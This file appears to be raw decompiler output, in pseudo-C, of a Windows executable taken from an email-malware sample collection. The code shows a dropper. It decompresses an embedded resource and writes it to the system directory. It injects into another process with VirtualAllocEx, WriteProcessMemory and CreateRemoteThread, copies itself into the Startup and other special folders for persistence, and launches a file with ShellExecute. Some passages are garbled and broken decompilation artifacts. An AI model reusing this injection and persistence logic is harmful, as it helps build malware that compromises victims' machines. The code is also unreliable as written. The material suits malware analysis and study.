/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0791/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401000 - 0x00401047
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401000(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    (save)esi;
    (save)0;
    (save)128;
    (save)2;
    (save)0;
    (save)0;
    (save)-1073741824;
    (save)Ac;
    eax = *__imp__CreateFileA();
    esi = eax;
    if(esi == 0) {
        eax = eax + 1;
    } else {
        *__imp__WriteFile();
        *__imp__CloseHandle(esi, esi, A8, A10, ebp - 4, 0);
        eax = 0;
    }
    (restore)esi;
}

/*	Procedure: 0x00401048 - 0x004010C2
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401048(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    (save)ebx;
    (save)esi;
    (save)edi;
    (save)0;
    (save)10;
    esi = *__imp__GetModuleHandleA();
    (save)1;
    (save)esi;
    edi = *__imp__FindResourceA();
    (save)edi;
    (save)esi;
    (save) *__imp__LoadResource();
    eax = *__imp__LockResource();
    ebx = eax;
    if(ebx == 0) {
        eax = eax + 1;
    } else {
        (save)edi;
        (save)esi;
        eax = *__imp__SizeofResource();
        if(eax == 0) {
            (save)2;
        } else {
            esi = L004014BE(ebx, eax, ebp - 4);
            if(esi != 0) {
                goto L004010a7;
            }
            (save)3;
        }
        (restore)eax;
        goto L004010be;
L004010a7:
        L00401000(esi, A8, *(ebp - 4));
        (save)esi;
        L00401536();
        esp = esp + 16;
        eax = 0;
    }
L004010be:
    (restore)edi;
    (restore)esi;
    (restore)ebx;
}

/*	Procedure: 0x004010C3 - 0x00401171
 *	Argument size: -8
 *	Local size: 16
 *	Save regs size: 0
 */

L004010C3(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    eax = Ac;
    (save)ebx;
    (save)esi;
    (save)edi;
    edx = eax + 1;
    ebx = 0;
    do {
        cl = *eax;
        eax = eax + 1;
    } while(cl != bl);
    (save)A8;
    esi = eax - edx;
    Vfffffff8 = ebx;
    if(*__imp__IsWindow() != 0) {
        (save) & Vfffffffc;
        (save)A8;
        *__imp__GetWindowThreadProcessId();
    }
    (save)Vfffffffc;
    (save)ebx;
    (save)2035711;
    (save)4;
    (save)12288;
    (save)esi;
    edi = *__imp__OpenProcess();
    (save)ebx;
    (save)edi;
    eax = *__imp__VirtualAllocEx();
    (save) & Vfffffff8;
    (save)esi;
    (save)Ac;
    Vfffffff4 = eax;
    (save)Vfffffff4;
    (save)edi;
    eax = *__imp__WriteProcessMemory();
    Vfffffff0 = eax;
    if(eax != ebx) {
        esi = __imp__GetModuleHandleA;
        (save)4202672;
        eax = *__imp__GetModuleHandleA();
        if(eax == ebx) {
            (save)4202656;
            eax = *esi();
        }
        *__imp__CreateRemoteThread(edi, ebx, ebx, *__imp__GetProcAddress(), eax, 4202640, Vfffffff4, ebx, ebx);
    }
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    return(Vfffffff0);
}

stack space not deallocated on return
/*	Procedure: 0x00401172 - 0x00401196
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401172()
{



    (save)0;
    (save)4202704;
    eax = *__imp__FindWindowA();
    if(eax == 0) {
        eax = *__imp__GetForegroundWindow();
    }
    (save)4202688;
    (save)eax;
    return(L004010C3());
}

/*	Procedure: 0x00401197 - 0x004012A1
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401197(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    (save)ecx;
    (save)ebx;
    eax = L00401560(261);
    ebx = eax;
    if(ebx != 0) {
        (save)esi;
        (save)edi;
        (save)ebp - 4;
        (save)A8;
        (save)0;
        if(*__imp__SHGetSpecialFolderLocation() == 0) {
            (save)ebx;
            (save) *(ebp - 4);
            if(*__imp__SHGetPathFromIDListA() != 0) {
                (save) *(ebp - 4);
                *__imp__CoTaskMemFree();
                edi = ebx - 1;
                do {
                    al = *(edi + 1);
                    edi = edi + 1;
                } while(al != 0);
                eax = ebx;
                *edi = *L004020F0;
                edi = edi + 4;
                esi = 4202740;
                esi = eax + 1;
                do {
                    cl = *eax;
                    eax = eax + 1;
                } while(cl != 0);
                ebx = L00401549(ebx, eax - esi + 1);
                if(ebx == 0) {
                    goto L00401265;
                }
                edx = L00401560(13);
                *(ebp - 8) = edx;
                if(edx != 0) {
                    goto L00401229;
                }
            }
        }
        (save)ebx;
        L00401536();
        eax = 0;
        goto L0040129c;
L00401229:
        edi = edx;
        *edi = *L004020E0;
        edi = edi + 4;
        *edi = *L004020E4;
        edi = edi + 4;
        *edi = *L004020E8;
        edi = edi + 4;
        eax = ebx;
        *edi = *L004020EC;
        edi = edi + 1;
        esi = 4202733;
        esi = eax + 1;
        do {
            cl = *eax;
            eax = eax + 1;
        } while(cl != 0);
        ecx = eax - esi;
        eax = edx;
        esi = eax + 1;
        do {
            dl = *eax;
            eax = eax + 1;
        } while(dl != 0);
        ebx = L00401549(ebx, eax - esi + ecx + 1);
        if(ebx == 0) {
L00401265:
            eax = 0;
        } else {
            eax = *(ebp - 8);
            edx = eax;
            do {
                cl = *eax;
                eax = eax + 1;
            } while(cl != 0);
            edi = ebx;
            eax = eax - edx;
            edi = edi - 1;
            do {
                cl = *(edi + 1);
                edi = edi + 1;
            } while(cl != 0);
            (save) *(ebp - 8);
            ecx = eax >> 2;
            esi = edx;
            asm("rep movsd");
            ecx = eax & 3;
            asm("rep movsb");
            L00401536();
            eax = ebx;
L0040129c:
            (restore)ecx;
        }
        (restore)edi;
        (restore)esi;
    }
    (restore)ebx;
}

/*	Procedure: 0x004012A2 - 0x004012EC
 *	Argument size: 4
 *	Local size: 264
 *	Save regs size: 4
 */

L004012A2(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffef8;



    eax = L00401197(A8);
    esi = eax;
    if(esi != 0) {
        (save)260;
        (save) & Vfffffef8;
        (save)0;
        if(*__imp__GetModuleFileNameA() != 0) {
            (save)0;
            (save)esi;
            (save) & Vfffffef8;
            *__imp__CopyFileA();
        }
        eax = L00401536(esi);
    }
}

/*	Procedure: 0x004012ED - 0x004013A5
 *	Argument size: -528
 *	Local size: 528
 *	Save regs size: 0
 */

L004012ED()
{
	/* unknown */ void  Vfffffdf0;
	/* unknown */ void  Vfffffef8;
	/* unknown */ void  Vfffffffc;



    if(*__imp__SHGetSpecialFolderLocation(0, 7, & Vfffffffc) != 0) {
        return(1);
    }
    (save) & Vfffffef8;
    (save)Vfffffffc;
    if(*__imp__SHGetPathFromIDListA() == 0) {
        (save)2;
    } else {
        (save)esi;
        (save)edi;
        (save)Vfffffffc;
        *__imp__CoTaskMemFree();
        (save)2;
        (save) & Vfffffef8;
        *__imp__SetFileAttributesA();
        edi = & Vfffffef8 - 1;
        do {
            al = *(edi + 1);
            edi = edi + 1;
        } while(al != 0);
        *edi = *L004020F0;
        edi = edi + 4;
        esi = 4202740;
        edi = & Vfffffef8 - 1;
        do {
            al = *(edi + 1);
            edi = edi + 1;
        } while(al != 0);
        *edi = *L004020E0;
        edi = edi + 4;
        *edi = *L004020E4;
        edi = edi + 4;
        *edi = *L004020E8;
        edi = edi + 4;
        *edi = *L004020EC;
        edi = edi + 1;
        esi = 4202733;
        (restore)edi;
        (restore)esi;
        if(*__imp__GetModuleFileNameA(0, & Vfffffdf0, 260) != 0) {
            goto L0040138c;
        }
        (save)3;
    }
    (restore)eax;
    return;
L0040138c:
    *__imp__CopyFileA( & Vfffffdf0, & Vfffffef8, 0);
    return(0);
}

/*	Procedure: 0x004013A6 - 0x00401443
 *	Argument size: 0
 *	Local size: 264
 *	Save regs size: 4
 */

L004013A6()
{
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffef8;



    L004012A2(21);
    L004012A2(43);
    L004012ED();
    esi = 260;
    (save)260;
    (save) & Vfffffef8;
    eax = *__imp__GetSystemDirectoryA();
    if(eax == 0) {
        eax = eax + 1;
    } else {
        eax = & Vfffffef8;
        edx = eax + 1;
        do {
            cl = *eax;
            eax = eax + 1;
        } while(cl != 0);
        if(eax - edx + 13 > esi) {
            eax = 2;
        } else {
            (save)edi;
            edi = & Vfffffef8 - 1;
            do {
                al = *(edi + 1);
                edi = edi + 1;
            } while(al != 0);
            *edi = *L004020F0;
            edi = edi + 4;
            esi = 4202740;
            edi = & Vfffffef8 - 1;
            do {
                al = *(edi + 1);
                edi = edi + 1;
            } while(al != 0);
            *edi = *L004020C0;
            edi = edi + 4;
            *edi = *L004020C4;
            edi = edi + 4;
            *edi = *L004020C8;
            edi = edi + 4;
            *edi = *L004020CC;
            edi = edi + 1;
            esi = 4202701;
            L00401048( & Vfffffef8);
            L00401172();
            eax = 0;
            (restore)edi;
        }
    }
}

/*	Procedure: 0x00401444 - 0x0040148C
 *	Argument size: -264
 *	Local size: 264
 *	Save regs size: 0
 */

L00401444()
{
	/* unknown */ void  Vfffffef8;



    (save)esi;
    (save)edi;
    (save)260;
    (save) & Vfffffef8;
    (save)0;
    *__imp__GetModuleFileNameA();
    (save)13;
    (restore)ecx;
    edi = 4202720;
    eax = 0;
    asm("repe cmpsb");
    (restore)edi;
    (restore)esi;
    if(!(esi = L00401573( & Vfffffef8, 92) + 1)) {
        asm("sbb eax,eax");
        asm("sbb eax,-0x1");
    }
}

/*	Procedure: 0x0040148D - 0x004014A5
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L0040148D()
{



    L004013A6();
    if(L00401444() != 0) {
        L004014A6();
    }
    return(1);
}

stack space not deallocated on return
/*	Procedure: 0x004014A6 - 0x004014BD
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004014A6()
{



    return(*__imp__ShellExecuteA(0, 4202740, 4202748, 0, 0, 3));
}

/*	Procedure: 0x004014BE - 0x00401535
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L004014BE(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    (save)Ac;
    (save)A10;
    (save)edi;
    L00401DD0();
    edi = A8;
    eax = edi + Ac;
    ecx = *(eax - 1) & 255;
    *A10 = ecx;
    edx = *(eax - 2) & 255;
    ecx = (ecx << 8) + edx;
    *A10 = ecx;
    edx = *(eax - 3) & 255;
    ecx = (ecx << 8) + edx;
    *A10 = ecx;
    eax = *(eax - 4) & 255;
    *A10 = eax + (ecx << 8);
    eax = L00401560(A10);
    A8 = eax;
    if(eax != 0) {
        *(ebp - 4) = *A10;
        if(L00401710(eax, ebp - 4, edi, Ac) != 0 || *(ebp - 4) != *A10) {
            goto L0040152f;
        }
        eax = A8;
    } else {
L0040152f:
        eax = 0;
    }
    (restore)edi;
    (restore)A10;
    (restore)Ac;
}

stack space not deallocated on return
/*	Procedure: 0x00401536 - 0x00401548
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401536(A4)
/* unknown */ void  A4;
{



    return(*__imp__HeapFree( *L004030E0, 0, A4));
}

stack space not deallocated on return
/*	Procedure: 0x00401549 - 0x0040155F
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401549(A8)
/* unknown */ void  A8;
{



    return(*__imp__HeapReAlloc( *L004030E0, 0, A8, A8));
}

stack space not deallocated on return
/*	Procedure: 0x00401560 - 0x00401572
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401560(A4)
/* unknown */ void  A4;
{



    return(*__imp__HeapAlloc( *L004030E0, 0, A4));
}

/*	Procedure: 0x00401573 - 0x004015A3
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401573(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    eax = A4;
    ecx = eax;
    if(*eax != 0) {
        do {
            ecx = ecx + 1;
        } while(*ecx != 0);
        while(ecx != eax && *ecx != A8) {
            ecx = ecx - 1;
        }
    }
    eax = ~( *ecx - A8);
    asm("sbb eax,eax");
    return(!eax & ecx);
}

/*	Procedure: 0x004015A4 - 0x0040167A
 *	Argument size: -68
 *	Local size: 68
 *	Save regs size: 0
 */

__entry_point__()
{
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;



    eax = *L004030E4;
    if(eax != 0) {
        if(*eax() != 0) {
            goto L004015bd;
        }
        (save)-2;
    } else {
L004015bd:
        if(L004016C5(0x403008, 0x403010, 1) == 0) {
            goto L004015dd;
        }
        (save)-3;
    }
    *__imp__ExitProcess();
L004015dd:
    (save)esi;
    L004016C5(0x403000, 0x403004, 0);
    esi = *__imp__GetCommandLineA();
    if(esi == 0) {
        esi = 4202772;
    }
    cl = 32;
    goto L0040160c;
L00401607:
    if(al <= 32) {
        esi = esi + 1;
L0040160c:
        al = *esi;
        if(al != 0) {
            goto L00401607;
        }
        if(al <= 32) {
            goto L0040162d;
        }
    }
    al = *esi;
L00401618:
    if(al == 34) {
        cl = cl ^ 32;
    }
    esi = esi + 1;
    al = *esi;
    if(al > cl) {
        goto L00401618;
    }
    goto L0040162d;
L00401628:
    if(al <= cl) {
        esi = esi + 1;
L0040162d:
        al = *esi;
        if(al != 0) {
            goto L00401628;
        }
    }
    Vffffffe8 = 0;
    (save) & Vffffffbc;
    eax = *__imp__GetStartupInfoA();
    eax & 168626701;
    eax = eax - 1414677335 - 168626701;
    if(Vffffffe8 & 1) {
        goto L09fe34c0;
    }
    eax = Vffffffec & 65535;
    goto "PVj";
    eax = 10;
    (save)eax;
    eax = L00401690(L0040148D( *__imp__GetModuleHandleA(), 0, 0, esi));
    (restore)esi;
}

/*	Procedure: 0x0040167B - 0x0040168F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040167B()
{



    eax = *__imp__GetProcessHeap();
    *L004030E0 = eax;
    return(0 & 255);
}

/*	Procedure: 0x00401690 - 0x004016C4
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401690(A4)
/* unknown */ void  A4;
{



    L004016EC();
    L004016C5();
    L004016C5(0x40301c, 0x403020, 0, 0x403014, 0x403018, 0);
    (save)A4;
    *__imp__ExitProcess();
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x004016C5 - 0x004016EB
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 4
 */

L004016C5(Ac, A10, A14)
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  esi;



    for(esi = Ac; esi < A10; esi = esi + 4) {
        eax = *esi;
        if(eax != 0) {
            eax = *eax();
            if(A14 != 0 && eax != 0) {
                goto L004016ea;
            }
        }
    }
    eax = 0;
L004016ea:
}

/*	Procedure: 0x004016EC - 0x00401709
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004016EC()
{



    while(*L00403040 != 0) {
        *L00403040 = *L00403040 - 1;
        eax = *( *L00403040 * 4 + 0x403060)();
    }
}

/*	Procedure: 0x0040170A - 0x0040170F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040170A()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401710 - 0x0040184A
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 4
 */

L00401710(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{



    Ac = A10;
    if(*Ac == 31 && *(Ac + 1) == 139 && *(Ac + 2) == 8) {
        al = *(Ac + 3);
        if(!(al & 224)) {
            al & 4;
            (save)A8;
            if(!(A8 = Ac + 10)) {
                ecx = *(A8 + 1) & 255;
                edx = *A8 & 255;
                ecx = ecx << 8;
                A8 = edx + A8 + ecx + 2;
            }
            if(!(al & 8)) {
                if(*A8 != 0) {
                    do {
                        cl = *(A8 + 1);
                        A8 = A8 + 1;
                    } while(cl != 0);
                }
                A8 = A8 + 1;
            }
            if(!(al & 16)) {
                if(*A8 != 0) {
                    do {
                        cl = *(A8 + 1);
                        A8 = A8 + 1;
                    } while(cl != 0);
                }
                A8 = A8 + 1;
            }
            (save)edi;
            if(!(al & 2)) {
                edi = *(A8 + 1) & 255;
                eax = *A8 & 255;
                edi = (edi << 8) + eax;
                if(edi != (L00401F90(Ac, A8 - Ac) & 65535)) {
                    (restore)edi;
                    (restore)A8;
                    return(-3);
                }
                A8 = A8 + 2;
            }
            eax = A14;
            edi = *(Ac + eax - 1) & 255;
            edx = *(Ac + eax - 2) & 255;
            ecx = *(Ac + eax - 3) & 255;
            (save)ebx;
            ebx = *(Ac + eax - 5) & 255;
            edi = (edi << 8) + edx;
            edx = *(Ac + eax - 4) & 255;
            edi = (edi << 8) + ecx;
            ecx = *(Ac + eax - 6) & 255;
            ebx = (ebx << 8) + ecx;
            ecx = *(Ac + eax - 8) & 255;
            edi = (edi << 8) + edx;
            edx = *(Ac + eax - 7) & 255;
            ebx = (ebx << 8) + edx;
            edx = Ac - A8 + eax - 8;
            ebx = (ebx << 8) + ecx;
            if(L00401E90(A8, Ac, A8, edx) != 0) {
L0040181a:
                (restore)ebx;
                (restore)edi;
                (restore)A8;
                return(-3);
            }
            if(*Ac != edi) {
                goto L0040181a;
            }
            eax = L00401F90(A8, edi);
            ecx = 0 & 255;
            (restore)ebx;
            (restore)edi;
            (restore)A8;
            return(ecx - 1 & -3);
        }
    }
    return(-3);
}

/*	Procedure: 0x0040184B - 0x0040184F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040184B()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401850 - 0x00401924
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401850()
{



    ecx = 0;
    edx = eax;
    *edx = 0;
    *(edx + 4) = 0;
    *(edx + 8) = 0;
    *(edx + 12) = 0;
    *(eax + 14) = 24;
    *(eax + 16) = 152;
    *(eax + 18) = 112;
    edx = eax + 32;
    (save)edi;
    do {
        edi = ecx + 256;
        *edx = di;
        ecx = ecx + 1;
        edx = edx + 2;
    } while(ecx < 24);
    ecx = 0;
    edx = eax + 80;
    (restore)edi;
    do {
        *edx = cx;
        ecx = ecx + 1;
        edx = edx + 2;
    } while(ecx < 144);
    *(eax + 368) = 280;
    *(eax + 370) = 281;
    *(eax + 372) = 282;
    *(eax + 374) = 283;
    *(eax + 376) = 284;
    *(eax + 378) = 285;
    *(eax + 380) = 286;
    *(eax + 382) = 287;
    ecx = 0;
    eax = eax + 384;
    do {
        edx = ecx + 144;
        *eax = dx;
        ecx = ecx + 1;
        eax = eax + 2;
    } while(ecx < 112);
    eax = 0;
    ecx = esi;
    *ecx = 0;
    *(ecx + 4) = 0;
    *(ecx + 8) = 0;
    *(esi + 10) = 32;
    ecx = esi + 32;
    do {
        *ecx = ax;
        eax = eax + 1;
        ecx = ecx + 2;
    } while(eax < 32);
}

/*	Procedure: 0x00401925 - 0x0040192F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401925()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401930 - 0x004019CB
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401930(A4)
/* unknown */ void  A4;
{
	/* unknown */ void  Vffffffe0;



    eax = 0;
    ecx = edx;
    *ecx = 0;
    *(ecx + 4) = 0;
    *(ecx + 8) = 0;
    *(ecx + 12) = 0;
    *(ecx + 16) = 0;
    esp = esp - 32;
    *(ecx + 20) = 0;
    (save)esi;
    esi = A4;
    *(ecx + 24) = 0;
    *(ecx + 28) = 0;
    if(esi > 0) {
        do {
            ecx = *(eax + edi) & 255;
            *(edx + ecx * 2) = *(edx + ecx * 2) + 1;
            ecx = edx + ecx * 2;
            eax = eax + 1;
        } while(eax < esi);
    }
    (save)ebx;
    ecx = 0;
    (save)ebp;
    *edx = 0;
    eax = edx;
    esi = & Vffffffe0 - edx;
    ebx = 16;
    do {
        *(esi + eax) = cx;
        ecx = ecx + ( *eax & 65535);
        eax = eax + 2;
    } while(ebx = ebx - 1);
    esi = A4;
    eax = 0;
    (restore)ebp;
    (restore)ebx;
    if(esi > 0) {
        do {
            cl = *(eax + edi);
            if(cl != 0) {
                *(edx + ( *(esp + (cl & 255) * 2 + 4) & 65535) * 2 + 32) = ax;
                ecx = *(eax + edi) & 255;
                *(esp + ecx * 2 + 4) = *(esp + ecx * 2 + 4) + 1;
                ecx = esp + ecx * 2 + 4;
            }
            eax = eax + 1;
        } while(eax < esi);
    }
    (restore)esi;
    esp = esp + 32;
}

/*	Procedure: 0x004019CC - 0x004019CF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004019CC()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x004019D0 - 0x00401A45
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 4
 */

L004019D0(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;



    ebx = 0;
    if(ecx != 0) {
        (save)esi;
        (save)edi;
        edi = 1 << cl;
        esi = 1;
        if(edi > 1) {
            do {
                eax = *(edx + 8);
                eax :: 0;
                if(!( *(edx + 8) = eax - 1)) {
                    eax = *edx;
                    ecx = *eax & 255;
                    *(edx + 4) = ecx;
                    *edx = eax + 1;
                    *(edx + 8) = 7;
                }
                eax = *(edx + 4);
                ecx = eax & 1;
                *(edx + 4) = eax >> 1;
                if(ecx != 0) {
                    ebx = ebx + esi;
                }
                esi = esi + esi;
            } while(esi < edi);
            (restore)edi;
            (restore)esi;
            return(ebx + A8);
        }
        (restore)edi;
        (restore)esi;
        return(A8 + ebx);
    }
    return(ebx + A8);
}

/*	Procedure: 0x00401A46 - 0x00401A4F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401A46()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401A50 - 0x00401AA7
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 8
 */

L00401A50(Ac)
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  ebp;



    (save)esi;
    (save)edi;
    ebx = 0;
    esi = 0;
    edi = Ac;
    do {
        eax = *(edx + 8);
        eax :: 0;
        if(!( *(edx + 8) = eax - 1)) {
            eax = *edx;
            ecx = *eax & 255;
            *(edx + 4) = ecx;
            *edx = eax + 1;
            *(edx + 8) = 7;
        }
        eax = *(edx + 4);
        ecx = eax;
        eax = eax >> 1;
        edi = edi + 2;
        *(edx + 4) = eax;
        eax = *edi & 65535;
        esi = esi + esi;
        ecx = ecx & 1;
        esi = esi - eax;
        ebx = ebx + eax;
    } while(esi = esi + ecx);
    eax = *(ebp + (esi + ebx) * 2 + 32) & 65535;
    (restore)edi;
    (restore)esi;
}

/*	Procedure: 0x00401AA8 - 0x00401AAF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401AA8()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401AB0 - 0x00401C81
 *	Argument size: 12
 *	Local size: 944
 *	Save regs size: 8
 */

L00401AB0(A3bc, A3c0, A3c4)
/* unknown */ void  A3bc;
/* unknown */ void  A3c0;
/* unknown */ void  A3c4;
{
	/* unknown */ void  V8;
	/* unknown */ void  Vc;
	/* unknown */ void  ebx;
	/* unknown */ void  V10;
	/* unknown */ void  V14;
	/* unknown */ void  V18;
	/* unknown */ void  V1c;
	/* unknown */ void  V20;
	/* unknown */ void  V24;
	/* unknown */ void  V28;
	/* unknown */ void  V2a;
	/* unknown */ void  V158;



    (save)esi;
    (save)edi;
    ecx = 5;
    A3c4 = A3bc;
    ebx = L004019D0(257);
    ecx = 5;
    A3c4 = A3bc;
    V10 = ebx;
    ecx = 4;
    A3c4 = A3bc;
    V8 = L004019D0(1);
    edi = L004019D0(4);
    V18 = 0;
    V1c = 0;
    V20 = 0;
    V24 = 0;
    V28 = 0;
    esi = 0;
    V2a = 0;
    if(edi > 0) {
        do {
            ecx = 3;
            A3c4 = A3bc;
            L004019D0(0);
            ecx = *(esi + 4202776) & 255;
            esi = esi + 1;
            *(esp + ecx + 32) = al;
        } while(esi < edi);
    }
    edi = & V18;
    A3c4 = & V158;
    L00401930(19);
    eax = V8 + ebx;
    esi = 0;
    Vc = eax;
    if(eax > 0) {
        do {
            A3c4 = A3bc;
            if(ecx = L00401A50( & V158) - 16) {
                bl = *(esp + esi + 31);
                ecx = 2;
                A3c4 = A3bc;
                eax = L004019D0(3);
                V14 = eax;
                if(eax != 0) {
                    bh = bl;
                    ecx = eax;
                    al = bl;
                    A3c4 = ecx;
                    ecx = ecx >> 2;
                    edi = esp + esi + 32;
                    eax = ebx << 16;
                    ax = bx;
                    asm("rep stosd");
                    ecx = A3c4 & 3;
                    asm("rep stosb");
                    esi = esi + A3c4;
                }
            } else {
                if(!(ecx = ecx - 1)) {
                    goto L00401b8c;
                }
                ecx = 3;
                A3c4 = A3bc;
                A3c4 = L004019D0(3);
                if(A3c4 != 0) {
                    ecx = A3c4;
                    ebx = ecx;
                    ecx = ecx >> 2;
                    edi = esp + esi + 32;
                    eax = 0;
                    asm("rep stosd");
                    ecx = ebx & 3;
                    asm("rep stosb");
                    esi = esi + A3c4;
                    continue;
L00401b8c:
                    if(!(ecx = ecx - 1)) {
                        goto L00401b8f;
                    }
                    ecx = 7;
                    A3c4 = A3bc;
                    A3c4 = L004019D0(11);
                    if(A3c4 != 0) {
                        ecx = A3c4;
                        ebx = ecx;
                        ecx = ecx >> 2;
                        edi = esp + esi + 32;
                        eax = 0;
                        asm("rep stosd");
                        ecx = ebx & 3;
                        asm("rep stosb");
                        esi = esi + A3c4;
                        continue;
L00401b8f:
                        *(esp + esi + 32) = al;
                        esi = esi + 1;
                    }
                }
            }
        } while(esi < Vc);
        ebx = V10;
    }
    A3c4 = A3c0;
    edi = & V18;
    L00401930(ebx);
    edi = esp + ebx + 40;
    (restore)edi;
    (restore)esi;
    return(L00401930(V8));
}

/*	Procedure: 0x00401C82 - 0x00401C8F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401C82()
{



}

/*	Procedure: 0x00401C90 - 0x00401D5C
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 4
 */

L00401C90(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  V0;
	/* unknown */ void  ecx;



    (save)esi;
    esi = eax;
    eax = *(esi + 12);
    edx = esi;
    V0 = eax;
    eax = L00401A50(A8);
    if(eax != 256) {
        (save)ebp;
        (save)edi;
        do {
            >= ? L00401cc4 : ;
            *( *(esi + 12)) = al;
            eax = *(esi + 12) + 1;
L00401d27:
            edx = esi;
            *(esi + 12) = eax;
            eax = L00401A50(A8);
        } while(eax != 256);
        goto L00401d44;
        ecx = *(eax * 2 + 0x4031de) & 65535;
        ecx = *(eax - 257 + 0x403120) & 255;
        edx = esi;
        eax = L004019D0(ecx);
        edx = esi;
        edi = eax;
        eax = L00401A50(ebx);
        edx = *(eax * 2 + 4207520) & 65535;
        ecx = *(eax + 0x403100) & 255;
        edx = esi;
        eax = L004019D0(edx);
        ecx = 0;
        ebp = eax;
        if(edi > 0) {
L00401d10:
            edx = *(esi + 12);
            *(edx + ecx) = *(edx - ebp + ecx);
            ecx = ecx + 1;
            if(ecx < edi) {
                goto L00401d10;
            }
        }
        eax = *(esi + 12) + edi;
        goto L00401d27;
L00401d44:
        (restore)edi;
        (restore)ebp;
    }
    eax = *(esi + 16);
    edx = *(esi + 12);
    ecx = *eax;
    *eax = ecx + edx - V0;
    (restore)esi;
    return(0);
}

/*	Procedure: 0x00401D5D - 0x00401D5F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401D5D()
{



    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401D60 - 0x00401DCC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401D60()
{



    edx = *eax;
    ecx = *(edx + 1) & 255;
    (save)esi;
    esi = *edx & 255;
    ecx = (ecx << 8) + esi;
    esi = *(edx + 3) & 255;
    (save)edi;
    edi = *(edx + 2) & 255;
    esi = !((esi << 8) + edi) & 65535;
    if(ecx != esi) {
        (restore)edi;
        (restore)esi;
        return(-3);
    }
    ecx :: 0;
    if(!( *eax = edx + 4)) {
        esi = ecx;
        do {
            dl = *( *eax);
            *( *(eax + 12)) = dl;
            edx = *(eax + 12);
            edi = *eax;
            edx = edx + 1;
            edi = edi + 1;
            *(eax + 12) = edx;
            *eax = edi;
        } while(esi = esi - 1);
    }
    *(eax + 8) = 0;
    eax = *(eax + 16);
    edx = *eax + ecx;
    (restore)edi;
    *eax = edx;
    (restore)esi;
    return(0);
}

/*	Procedure: 0x00401DCD - 0x00401DCF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401DCD()
{



    asm("int3");
    asm("int3");
    asm("int3");
}

